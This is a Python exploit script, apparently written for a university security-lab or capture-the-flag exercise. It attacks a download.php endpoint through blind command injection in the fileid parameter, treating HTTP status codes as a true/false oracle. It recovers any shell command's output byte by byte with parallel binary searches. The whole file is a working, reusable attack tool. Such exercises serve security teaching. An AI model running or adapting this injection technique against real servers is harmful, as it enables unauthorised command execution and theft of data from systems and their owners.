import base64
import multiprocessing
import requests


CMD = 'ls'
YOUR_FILE_ID = 0
PHPSESSID = ''
PROCESSES = 16


cookies = { 'PHPSESSID': str(PHPSESSID) }

def ask_oracle(bash_cond):
    url = 'http://floppier.seclab.dais.unive.it/download.php?fileid={}' \
          ' | if {}; then cat; fi' \
        .format(YOUR_FILE_ID, bash_cond)
    res = requests.get(url, cookies=cookies)
    return res.status_code == 200

def byte_is_lesser_than(cmd, i, x):
    return ask_oracle(
        '[ "$(printf \'%d\\n\' "\'$({} | head -c {} | tail -c 1)")" -lt "{}" ]'
        .format(cmd, i + 1, x)
    )

def read_byte(cmd, i):
    a = 0
    b = 256
    for j in range(0, 8):
        m = (a + b) >> 1
        if byte_is_lesser_than(cmd, i, m):
            b = m
        else:
            a = m
    return a

def length_is_lesser_than(cmd, x):
    return ask_oracle(
        '[ "$({} | wc -c)" -lt "{}" ]'
        .format(cmd, x)
    )

def read_length(cmd):
    a = 0
    b = 256
    bits = 8
    f = True
    while not length_is_lesser_than(cmd, b):
        a = b
        b = b << 1
        if not f:
            bits = bits + 1
        f = False
    for i in range(bits):
        m = (a + b) >> 1
        if length_is_lesser_than(cmd, m):
            b = m
        else:
            a = m
    return a

def execute(cmd):
    cmd1 = '{} | base64'.format(cmd)

    pool = multiprocessing.Pool(processes=PROCESSES)
    jobs = [
        pool.apply_async(read_byte, args=(cmd1, i,))
        for i in range(read_length(cmd1))
    ]

    return base64.b64decode(bytes([j.get() for j in jobs])).decode('ascii')

print(execute(CMD))

